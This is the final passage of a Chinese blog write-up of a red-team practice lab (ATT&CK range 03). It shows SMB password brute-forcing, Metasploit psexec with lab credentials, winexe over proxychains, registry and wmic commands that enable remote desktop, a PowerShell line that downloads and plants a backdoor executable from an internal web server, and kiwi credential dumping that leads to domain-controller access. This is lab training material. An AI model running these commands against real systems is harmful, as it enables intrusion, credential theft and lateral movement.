+<p>换个方法，尝试爆破smb用户，将上面获取到的两个密码放入密码文件进行爆破</p>
+<img src="https://raw.githubusercontent.com/chencicici/images/main/202207240116897.png" style="zoom:50%;" />
+
+<p>最后爆破出30、20的密码</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240119461.png"></p>
+<p>使用msf自带模块来攻击,要注意的是这里使用正向连接payload，因为我们使用加了代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> SMBUser administrator</span><br><span class="line"><span class="built_in">set</span> SMBPass 123qwe!ASD</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.93.30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>得到一个system权限的会话</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240131876.png"></p>
+<p>通过winexe得到20的会话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%123qwe!ASD&#x27;</span> //192.168.93.20 cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240200277.png"></p>
+<p>他上线到msf，生成一个shell，因为目标主机不出网，所以把shell上传到centos主机上,再由centos主机用python起一个web服务，20主机使用powershell去下载</p>
+<img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245860.png" style="zoom:50%;" />
+
+<p>注意不要和web服务端口起冲突，使用8899端口</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245938.png"></p>
+<p>开启远程桌面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置远程桌面端口</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"><span class="comment">#开启远程桌面</span></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br><span class="line"><span class="comment">#检查端口状态</span></span><br><span class="line">netstat -an|find <span class="string">&quot;3389&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用administrator登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.93.128:8899/shell1.exe&#x27;</span>,<span class="string">&#x27;C:\shell.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下载后门</p>
+<img src="https://raw.githubusercontent.com/chencicici/images/main/202207240242645.png" style="zoom:50%;" />
+
+
+
+<p>kali起一个监听，注意这里要使用正向监听，因为目标主机是不出网的，运行后门成功反弹会话</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240248971.png"></p>
+<p>迁移进程到一个系统进程后，使用kiwi抓取密码，抓到域控密码</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240253602.png"></p>
+<p>使用同样的方法拿到cmd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%zxcASDqw123!!&#x27;</span> //192.168.93.10 cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一样的方法上线msf，只需要修改正向监听的ip即可</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240308139.png"></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Syst1m
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/" title="ATT&amp;CK红队实战靶场03">https://syst1m.top/2022/07/23/ATT-CK红队实战靶场03/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ATT-CK/" rel="tag"># ATT&CK</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/21/tp5-php7-3-getshell/" rel="prev" title="tp5+php7.3 getshell">
+                  <i class="fa fa-chevron-left"></i> tp5+php7.3 getshell
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Syst1m</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
